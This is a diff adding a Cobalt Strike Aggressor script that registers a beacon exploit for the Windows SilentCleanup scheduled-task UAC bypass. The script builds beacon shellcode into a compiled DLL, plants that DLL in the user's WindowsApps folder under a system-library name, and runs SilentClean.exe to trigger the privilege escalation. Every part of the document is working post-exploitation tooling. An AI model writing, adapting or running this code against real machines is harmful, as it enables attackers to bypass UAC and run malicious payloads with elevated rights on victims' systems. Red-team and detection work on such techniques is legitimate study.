@@ -1,0 +1,66 @@
+$mingwgcc = exec("which x86_64-w64-mingw32-gcc");
+$mingwdllwrap = exec("which x86_64-w64-mingw32-dllwrap");
+
+sub uac-silentcleanup {
+	if (-is64 $1) 
+	{
+		$arch = "x64";
+		$shellcode = artifact_payload($2, "raw", $arch); # generate shellcode for x64
+	} 
+	else 
+	{
+		$arch = "x86";
+		$shellcode = artifact_payload($2, "raw", $arch); # generate shellcode for x86
+	}
+
+	btask($1, "User tasked beacon to bypass UAC with silentcleanup scheduled task DLL planting", "T1548.002");
+	$user = binfo($1, "user");
+
+	# String building for shellcode into template
+	$shellbuf = "char shellcode[] = \"" . format_bytes($shellcode) . "\";\n";
+	$handle = openf(script_resource("dllmain_template.c"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	$fdata = strrep($data, "%%BUFFER%%", $shellbuf);
+	$destination = openf(">".script_resource("dllmain.c"));
+	writeb($destination,$fdata);
+	closef($destination);
+
+	if (-is64 $1) 
+	{
+		$build = exec($mingwgcc . " -m64 -c -Os " . script_resource("dllmain.c") . " -Wall -shared -o " . getFileParent(script_resource("dllmain.c")) . "/dllmain.o");
+
+		wait($build);
+	
+		$wrap = exec($mingwdllwrap . " -m64 --def " . script_resource("dllmain.def") . " " . script_resource("dllmain.o") . " -o " . getFileParent(script_resource("dllmain.c")) . "/api-ms-win-core-kernel32-legacy-l1.dll");
+
+		wait($wrap);
+	}
+	else
+	{
+		$build = exec($mingwgcc . " -m32 -c -Os " . script_resource("dllmain.c") . " -Wall -shared -o " . getFileParent(script_resource("dllmain.c")) . "/dllmain.o");
+
+		wait($build);
+	
+		$wrap = exec($mingwdllwrap . " -m32 --def " . script_resource("dllmain.def") . " " . script_resource("dllmain.o") . " -o " . getFileParent(script_resource("dllmain.c")) . "/api-ms-win-core-kernel32-legacy-l1.dll");
+
+		wait($wrap);
+	}
+
+	$dll = openf(script_resource("api-ms-win-core-kernel32-legacy-l1.dll"));
+	$dllbytes = readb($dll, -1);
+	closef($dll);
+
+	bupload_raw($1, "C:\\Users\\" . $user . "\\Appdata\\Local\\Microsoft\\WindowsApps\\api-ms-win-core-kernel32-legacy-l1.dll", $dllbytes);
+
+	bexecute_assembly($1, script_resource("SilentClean.exe"));
+}
+
+sub format_bytes {
+	$key = $1;
+	@fmt = str_chunk(transform($key, "veil"), 60);
+	return "". join("\"\n\"", @fmt);
+}
+
+beacon_exploit_register("uac-silentcleanup-1909", "Scheduled task uac bypass using silentcleanup with DLL planting", &uac-silentcleanup);
